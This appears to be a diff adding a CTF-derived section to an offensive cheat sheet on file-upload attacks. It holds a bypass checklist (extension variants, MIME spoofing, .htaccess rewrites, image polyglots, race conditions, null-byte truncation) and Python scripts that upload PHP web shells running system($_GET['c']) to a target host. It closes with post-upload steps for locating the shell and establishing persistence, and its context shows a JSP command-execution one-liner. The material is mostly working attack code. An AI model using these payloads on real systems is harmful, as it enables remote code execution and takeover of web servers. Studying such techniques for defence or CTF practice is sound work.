@@ -323,3 +323,63 @@ shell.php\x0A → parsed as PHP (newline char)
 ```jsp
 <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
 ```
+
+---
+
+## 来自 CTF 经验积累
+
+### Quick Detection Checklist
+1. **Direct Upload** - Try uploading `.php`, `.asp`, `.jsp` directly
+2. **Frontend Bypass** - Check if validation is JS-only (no network request)
+3. **Content-Type** - Change MIME type to `image/jpeg`
+4. **Extension Variants** - Try `.phtml`, `.php3`, `.php5`, `.PhP`
+5. **Special Characters** - Add space, dot, `::$DATA` to extension
+6. **Double Write** - `.pphphp` if extension is replaced with empty
+7. **.htaccess** - Upload config file to change parsing rules
+8. **Image Polyglot** - Add image header to webshell
+9. **Race Condition** - Continuous upload + access
+10. **Path Truncation** - `%00` null byte in save path
+
+### 攻击场景
+
+**Scenario 1: Basic Upload**
+```python
+import requests
+files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'application/octet-stream')}
+r = requests.post('http://target/upload.php', files=files)
+```
+
+**Scenario 2: Content-Type Bypass**
+```python
+files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
+```
+
+**Scenario 3: .htaccess + Image**
+```python
+# Step 1: Upload .htaccess
+htaccess = 'AddType application/x-httpd-php .jpg'
+files = {'file': ('.htaccess', htaccess, 'text/plain')}
+requests.post('http://target/upload.php', files=files)
+# Step 2: Upload PHP code as .jpg
+files = {'file': ('shell.jpg', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
+```
+
+**Scenario 4: Image Polyglot**
+```python
+payload = b'GIF89a<?php system($_GET["c"]); ?>'
+files = {'file': ('shell.gif', payload, 'image/gif')}
+# Need file inclusion to execute
+```
+
+**Scenario 5: Race Condition**
+```python
+import threading
+def upload(): requests.post('http://target/upload.php', files=files)
+def access(): r = requests.get('http://target/uploads/shell.php?c=id')
+# Run multiple threads concurrently
+```
+
+### Post-Upload Steps
+1. **Find Upload Location** - Check response, try common paths: `/uploads/`, `/files/`, `/images/`
+2. **Verify Execution** - Access directly, check if code executed or displayed
+3. **Establish Persistence** - Upload webshell for remote control
